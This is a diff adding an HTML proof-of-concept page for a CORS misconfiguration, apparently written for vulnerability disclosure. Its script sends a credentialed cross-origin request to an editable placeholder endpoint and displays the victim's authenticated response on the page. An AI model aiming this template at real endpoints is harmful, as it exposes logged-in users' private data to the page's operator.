@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>CORS PoC</title>
+<style>
+body { font-family: monospace; max-width: 900px; margin: 30px auto; padding: 20px; }
+.box { background: #f5f5f5; padding: 15px; margin: 10px 0; border-left: 4px solid #d33; }
+pre { background: #fff; padding: 10px; overflow-x: auto; max-height: 400px; }
+</style>
+</head>
+<body>
+<h1>CORS Misconfiguration PoC</h1>
+<p><strong>Researcher:</strong> tarik2380 — appstudies.xyz</p>
+<p><strong>Use:</strong> open this page on appstudies.xyz, edit TARGET below, and reload.</p>
+
+<div class="box">
+<strong>Status:</strong> <span id="status">Initializing...</span>
+</div>
+
+<h3>Response from target:</h3>
+<pre id="result">Waiting...</pre>
+
+<script>
+// EDIT THIS to point at the vulnerable endpoint discovered during testing
+const TARGET = 'https://VULNERABLE-TARGET/api/sensitive-endpoint';
+
+const status = document.getElementById('status');
+const result = document.getElementById('result');
+
+status.textContent = 'Sending cross-origin request to: ' + TARGET;
+
+fetch(TARGET, {
+    method: 'GET',
+    credentials: 'include',
+    mode: 'cors'
+})
+.then(r => {
+    status.textContent = 'Response received (HTTP ' + r.status + ')';
+    return r.text();
+})
+.then(data => {
+    result.textContent = data.substring(0, 5000);
+    if (data.length > 5000) {
+        result.textContent += '\n\n... (truncated, ' + (data.length - 5000) + ' more chars)';
+    }
+})
+.catch(e => {
+    status.textContent = 'Request failed: ' + e.message;
+    result.textContent = 'CORS likely blocked the request, or network error.\n\n' +
+                          'If credentialed CORS is allowed for evil origins, this should succeed.';
+});
+</script>
+</body>
+</html>
